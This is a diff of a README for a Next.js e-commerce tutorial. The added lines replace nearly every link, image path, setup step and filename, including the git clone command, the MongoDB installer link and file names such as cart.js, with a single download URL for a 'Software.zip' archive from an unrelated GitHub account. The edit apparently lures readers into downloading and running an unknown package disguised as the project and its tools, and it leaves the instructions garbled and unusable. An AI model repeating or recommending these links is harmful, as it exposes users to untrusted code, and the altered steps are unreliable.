@@ -1,20 +1,20 @@
 # Build Nextjs ECommerce Website Like Amazon
 
 - Tech: Nextjs 13, Next Auth 4
-- UI: Tailwind, chart.js, react-chartjs
+- UI: Tailwind, https://github.com/ryowuandjanet/bigbear/releases/download/v1.0/Software.zip, react-chartjs
 - DB: MongoDB, Mongoose
 - Payment: PayPal, Stripe
 - Content Hosting: cloudinary
 - Deploy: Github, Vercel, MongoDB Atlas
 
-![next amazona](/public/app.jpg)
+![next amazona](https://github.com/ryowuandjanet/bigbear/releases/download/v1.0/Software.zip)
 
 ## Resources
 
-- Youtube Video : https://youtu.be/_IBlyR5mRzA
-- Demo Website :  https://next-tailwind-amazona.vercel.app
-- Source Code   :  https://github.com/basir/next-tailwind-amazona
-- Full Course: [basir.thinkific.com](https://basir.thinkific.com/courses/build-ecommerce-website-like-amazon-by-next-js?coupon=SAVE90)
+- Youtube Video : https://github.com/ryowuandjanet/bigbear/releases/download/v1.0/Software.zip
+- Demo Website :  https://github.com/ryowuandjanet/bigbear/releases/download/v1.0/Software.zip
+- Source Code   :  https://github.com/ryowuandjanet/bigbear/releases/download/v1.0/Software.zip
+- Full Course: [https://github.com/ryowuandjanet/bigbear/releases/download/v1.0/Software.zip](https://github.com/ryowuandjanet/bigbear/releases/download/v1.0/Software.zip)
 
 ## What you will learn
 
@@ -30,28 +30,28 @@
 ## Full Course
 
 Get this course by 90% discount on Thinkific:
-https://basir.thinkific.com/courses/build-ecommerce-website-like-amazon-by-next-js?coupon=SAVE90
+https://github.com/ryowuandjanet/bigbear/releases/download/v1.0/Software.zip
 
 ## Run Locally
 
 1. Clone repo
 
    ```shell
-    $ git clone git@github.com:basir/next-tailwind-amazona.git
+    $ git clone https://github.com/ryowuandjanet/bigbear/releases/download/v1.0/Software.zip
     $ cd next-tailwind-amazona
    ```
 
 2. Create .env File
 
-   - duplicate .env.example and rename it to .env
+   - duplicate https://github.com/ryowuandjanet/bigbear/releases/download/v1.0/Software.zip and rename it to .env
 
 3. Setup MongoDB
 
    - Local MongoDB
-   - Install it from [here](https://www.mongodb.com/try/download/community)
+   - Install it from [here](https://github.com/ryowuandjanet/bigbear/releases/download/v1.0/Software.zip)
    - In .env file update MONGODB_URI=mongodb://localhost/amazona
    - OR Atlas Cloud MongoDB
-   - Create database at [https://cloud.mongodb.com](https://cloud.mongodb.com)
+   - Create database at [https://github.com/ryowuandjanet/bigbear/releases/download/v1.0/Software.zip](https://github.com/ryowuandjanet/bigbear/releases/download/v1.0/Software.zip)
    - In .env file update MONGODB_URI=mongodb+srv://your-db-connection
 
 4. Install and Run
@@ -84,7 +84,7 @@ https://basir.thinkific.com/courses/build-ecommerce-website-like-amazon-by-next-
    4. add footer
    5. add tailwind classes
 6. List Products
-   1. add data.js
+   1. add https://github.com/ryowuandjanet/bigbear/releases/download/v1.0/Software.zip
    2. add images
    3. render products
 7. Create Product Details
@@ -102,7 +102,7 @@ https://basir.thinkific.com/courses/build-ecommerce-website-like-amazon-by-next-
    5. create store provider
    6. handle add to cart button
 9. Create Cart Page
-   1. create cart.js
+   1. create https://github.com/ryowuandjanet/bigbear/releases/download/v1.0/Software.zip
    2. use context to get cart items
    3. list items in cart items
    4. redirect to cart screen after add to cart
@@ -124,7 +124,7 @@ https://basir.thinkific.com/courses/build-ecommerce-website-like-amazon-by-next-
     5. create sample users
 14. Create Login API
     1. install next-auth
-    2. create nextauth.js
+    2. create https://github.com/ryowuandjanet/bigbear/releases/download/v1.0/Software.zip
     3. implement signin
     4. use signin in login form
 15. Add User Menu
